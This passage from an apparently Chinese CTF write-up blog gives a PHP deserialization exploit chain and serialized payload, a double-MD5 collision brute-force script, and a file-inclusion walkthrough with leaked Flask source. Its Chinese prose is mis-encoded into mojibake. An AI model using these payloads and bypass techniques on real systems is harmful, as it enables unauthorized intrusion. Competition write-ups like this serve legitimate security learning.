class="line"><span class="variable">$a</span>-&gt;<span class="variable">$apple</span>-&gt;<span class="variable">$strawberry</span>=<span class="keyword">new</span> <span class="title class_">Heraclqs</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="variable">$apple</span>-&gt;<span class="variable">$strawberry</span>-&gt;<span class="variable">$grape</span>=<span class="keyword">new</span> E;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="variable">$apple</span>-&gt;<span class="variable">$grape</span>=<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>))</span><br></pre></td></tr></table></figure><br>åº”è¯¥å·®ä¸å¤šå°±æ˜¯è¿™æ ·å› ä¸ºæˆ‘çš„expæ²¡æœ‰æ‰¾åˆ°åªæ‰¾åˆ°äº†ä¹‹å‰bpä¸Šå‘é€çš„payloadæ‰€æœ‰ä¸Šé¢çš„expå¯èƒ½ä¼šçš„ç‚¹å°é—®é¢˜ï¼Œä½†æ˜¯å¤§ä½“æ€è·¯å°±æ˜¯è¿™æ ·ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;O:6:&quot;Sakura&quot;:2:&#123;s:5:&quot;apple&quot;;O:6:&quot;Sakura&quot;:2:&#123;s:5:&quot;apple&quot;;N;s:10:&quot;strawberry&quot;;O:8:&quot;Heraclqs&quot;:2:&#123;s:5:&quot;grape&quot;;O:1:&quot;E&quot;:2:&#123;s:17:&quot;DirectoryIterator&quot;;s:1:&quot;/&quot;;s:1:&quot;e&quot;;N;&#125;s:9:&quot;blueberry&quot;;s:20:&quot;sr22kaDugamdwTPhG5zU&quot;;&#125;&#125;s:10:&quot;strawberry&quot;;N;&#125;&#x27;;</span><br></pre></td></tr></table></figure><br>è¡¥å……ï¼šåŒå±‚md5ç»•è¿‡çš„è„šæœ¬<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒå±‚md5ç¢°æ’</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_double_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5_1 = hashlib.md5(rnds.encode()).hexdigest()</span><br><span class="line">        md5_2 = hashlib.md5(md5_1.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_2[start: start + str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Random String:&quot;</span>, rnds)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Double MD5 Hash:&quot;</span>, md5_2)</span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_double_md5, args=(substr,</span><br><span class="line">                                                                      stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>æ³¨æ„ä½¿ç”¨ç»ˆç«¯è¿è¡Œä¸Šé¢çš„ä»£ç ä¸è¦æŠŠæ–‡ä»¶åå†™æˆä¸­æ–‡ã€‚</p><h2 id="ç†æƒ³å›½"><a href="#ç†æƒ³å›½" class="headerlink" title="ç†æƒ³å›½"></a>ç†æƒ³å›½</h2><p>è§£é¢˜äººï¼šLSE<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;swagger&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;info&quot;: &#123;</span><br><span class="line">      &quot;description&quot;: &quot;Interface API Documentation&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;1.1&quot;,</span><br><span class="line">      &quot;title&quot;: &quot;Interface API&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;paths&quot;: &#123;</span><br><span class="line">      &quot;/api-base/v0/register&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Registration API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user registration&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Your wisdom is not sufficient to be called a sage&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/login&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Login API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user login&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/search&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Information Query API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used to query information&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;name&quot;: &quot;file&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;query&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;type&quot;: &quot;string&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;404&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;File not found&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/logout&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Logout API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user logout&quot;,</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;definitions&quot;: &#123;</span><br><span class="line">      &quot;UserRegistration&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;UserLogin&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;securityDefinitions&quot;: &#123;</span><br><span class="line">      &quot;TokenAuth&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;apiKey&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;Authorization&quot;,</span><br><span class="line">        &quot;in&quot;: &quot;header&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;security&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;TokenAuth&quot;: []</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>ç‚¹å¼€å‘ç°ç«¯å£ä¿¡æ¯å…¨éƒ½æ³„éœ²äº†<br>æˆ‘ä»¬å…ˆåˆ©ç”¨/api-base/v0/registerå’Œ/api-base/v0/loginè¿›è¡Œæ³¨å†Œç™»é™†ã€‚<br>åœ¨æ‰“å¼€/api-base/v0/searchè¿›è¡Œæœç´¢æ–‡ä»¶ï¼Œæˆ‘ä»¬ç¨å¾®å°è¯•ä¸€ä¸‹ä¼šå‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚<strong>å•Šå†™ä¸ä¸‹å»äº†ã€‚ä¸€ç›´åœ¨å¤ç°ï¼Œè¿™é¢˜æˆ‘å°±çº¯å£è¿°å§</strong><br>æˆ‘ä»¬é€šè¿‡æ–‡ä»¶åŒ…å«app.py(æˆ‘è®°å¾—æœ‰ä¸ªprocçš„æ–‡ä»¶æ˜¯å¯ä»¥çœ‹åˆ°å½“å‰è¿è¡Œè¿›ç¨‹çš„ï¼Œä¹‹å‰æœ‰æ‰¾åˆ°è¿‡ç°åœ¨æ‰¾ä¸åˆ°äº†)æ¥æŸ¥çœ‹æºç <br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;TEMPLATES_RELOAD&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line">current_time = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"></span><br><span class="line">response0 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;failed&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">response1 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: current_time&#125;</span><br><span class="line">response2 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid request parameters&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == User.username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == User.password:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&quot;Plato&quot;</span> <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == <span class="string">&quot;ideal_state&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;You are not a sage. You cannot enter the ideal state.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;api-docs.json&#x27;</span>, mimetype=<span class="string">&#x27;application/json;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/enterIdealState&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@check</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    flag = os.popen(<span class="string">&quot;/readflag&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;Plato&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your wisdom is not sufficient to be called a sage.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username, password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = User.token</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">                response = jsonify(response1)</span><br><span class="line">                response.set_cookie(<span 